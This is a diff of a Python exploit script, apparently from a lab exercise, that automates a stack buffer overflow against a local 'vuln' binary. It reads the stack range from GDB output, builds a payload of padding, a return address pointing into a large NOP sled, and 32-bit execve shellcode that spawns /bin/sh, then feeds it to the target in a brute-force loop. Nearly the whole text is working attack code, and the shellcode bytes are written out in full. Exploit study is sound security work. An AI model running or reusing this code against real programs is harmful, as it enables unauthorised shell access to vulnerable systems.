@@ -70,28 +70,6 @@ def cleanup(exit_code: int):
     sys.exit(exit_code)
 
 
-def stack_middle_address(output):
-
-    # Find the line containing the word "stack" and extract the address in the middle
-    output_lines = output.split('\n')
-    stack_line = next((line for line in output_lines if 'stack' in line), None)
-    
-    if stack_line is None:
-        print("GDB failed to find the stack line.")
-        cleanup(1)
-    
-    pattern = r'\b0x[0-9a-f]+\b'
-    matches = re.findall(pattern, stack_line)
-    
-    start_address = int(matches[0], 16)
-    end_address = int(matches[1], 16)
-    
-    middle = (start_address + end_address) // 2
-    middle += 4  #all the addresses end in 00 and when this is concatenated in bytes in the payload, it starts with \x00 and terminates the payload. Adding 4 to avoid the \x00 sequence
-
-    return middle
-
-
 def generate_test():
     return cyclic(1000)
 
@@ -174,8 +152,6 @@ def locate_ra2(pattern, target):
         print("No core file found")
 
         
-    
-
 def target_ra(target):
 
     #find in what adresses the stack fluctuates -> info proc mapping
@@ -211,18 +187,42 @@ def target_ra(target):
     return output
 
 
+def stack_middle_address(output):
+
+    # Find the line containing the word "stack" and extract the address in the middle
+    output_lines = output.split('\n')
+    stack_line = next((line for line in output_lines if 'stack' in line), None)
+    
+    if stack_line is None:
+        print("GDB failed to find the stack line.")
+        cleanup(1)
+    
+    pattern = r'\b0x[0-9a-f]+\b'
+    matches = re.findall(pattern, stack_line)
+    
+    start_address = int(matches[0], 16)
+    end_address = int(matches[1], 16)
+    
+    middle = (start_address + end_address) // 2
+    middle += 4  #all the addresses end in 00 and when this is concatenated in bytes in the payload, it starts with \x00 and terminates the payload. Adding 4 to avoid the \x00 sequence
+
+    # print(f"stack middle target addr: {hex(middle)}")
+    return middle
+
+
 def construct_payload(offset, target):
 
     middle = stack_middle_address(target_ra(target))
     shellcode = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'
 
     #!!! will change
-    offset += 4 
+    if target == 'vuln':
+        offset += 4 
     #!!!
 
     payload = b'A' * offset
     payload += struct.pack("<I", middle)
-    payload += b'\x90' * 200000
+    payload += b'\x90' * 130000
     payload += shellcode
 
     open("payload", "wb").write(payload)
@@ -322,7 +322,7 @@ def main():
     target = args.target
     input_mode = args.input_mode
 
-    context.log_level='warn'
+    # context.log_level='warn'
     # context.log_level = 'debug'
 
     #this program has PIE enabled -> compilation option that changes the location of the executable in every run
@@ -331,10 +331,11 @@ def main():
     construct_payload(ra_offset, target)
     attach_strace()
 
-
     #performing brute force attack
     # exploit_command = f"cat payload - | {target} " + " ".join(["`cat trash`"] * 15)
-    exploit_command = f"cat payload - | {target}"
+    exploit_command = f"cat payload - | {target} `cat payload`"
+    # exploit_command = f"cat payload - | {target} AAAAA"
+
 
     i = 0
     while True:
